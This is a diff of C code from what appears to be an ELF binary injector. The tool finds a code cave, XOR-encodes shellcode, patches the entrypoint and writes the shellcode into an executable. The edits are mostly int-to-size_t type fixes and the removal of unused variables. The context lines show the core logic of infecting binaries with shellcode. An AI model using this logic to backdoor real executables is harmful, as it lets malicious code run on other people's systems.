@@ -29,9 +29,9 @@ inject_xor_key(const uint8_t *shellcode, const size_t shellcode_size, const uint
 }
 bool
 overwrite_entrypoint(uint8_t *payload, size_t payload_size, Elf64_Addr entrypoint, uint64_t marker, size_t occurrences) {
-    int found = 0;
+    size_t found = 0;
 
-    for (int i = 0; i < payload_size - 8; ++i) {
+    for (size_t i = 0; i < payload_size - 8; ++i) {
         uint64_t *ptr = (uint64_t *)&payload[i];
 
         if (*ptr == marker) {
@@ -50,7 +50,7 @@ overwrite_entrypoint(uint8_t *payload, size_t payload_size, Elf64_Addr entrypoin
 void
 print_payload(uint8_t *payload, size_t payload_size) {
     printf("\n -- Final Payload --\n");
-    int i;
+    size_t i;
     for (i = 0; i < payload_size / 16; ++i) {
         for (int j = 0; j < 16; j += 2) {
             printf("0x%02x%02x ", payload[i * 16 + j], payload[i * 16 + j + 1]);
@@ -58,14 +58,14 @@ print_payload(uint8_t *payload, size_t payload_size) {
         printf("\n");
     }
     size_t remainder = payload_size % 16;
-    for (int j = 0; j < remainder; j += 2) {
+    for (size_t j = 0; j < remainder; j += 2) {
         printf("0x%02x%02x ", payload[i * 16 + j], payload[i * 16 + j + 1]);
     }
     printf("\n");
 }
 int
 code_cave_get(const Elf64_Ehdr header, const uint64_t ph_start, const uint64_t ph_end, code_cave_t *code_cave, int fd) {
-    int off = lseek(fd, header.e_shoff, SEEK_SET);
+    size_t off = lseek(fd, header.e_shoff, SEEK_SET);
     if (off != header.e_shoff) {
         perror("lseek - fd");
         return 1;
@@ -129,9 +129,6 @@ shellcode_inject(Elf64_Ehdr header, Elf64_Phdr program_header, const code_cave_t
     const uint64_t page_size = 0x1000;
     // round down to nearest page boundary for mprotect call (~(page_size - 1) = ~0xfff = 0xFFFFFFFFFFFFF000)
     const uint64_t text_start_aligned = program_header.p_vaddr & ~(page_size - 1);
-    const uint64_t text_end = program_header.p_vaddr + program_header.p_filesz;
-    // round up to next page boundary (same logic as for text_start_aligned)
-    const uint64_t text_end_aligned = (text_end + page_size - 1) & ~(page_size - 1);
 
     inject_xor_key(shellcode, shellcode_size, key);
 
@@ -167,7 +164,7 @@ shellcode_inject(Elf64_Ehdr header, Elf64_Phdr program_header, const code_cave_t
         return 1;
     }
 
-    int bytes_written = write(fd, shellcode, shellcode_size);
+    size_t bytes_written = write(fd, shellcode, shellcode_size);
     if (bytes_written != shellcode_size) {
         perror("write");
         return 1;
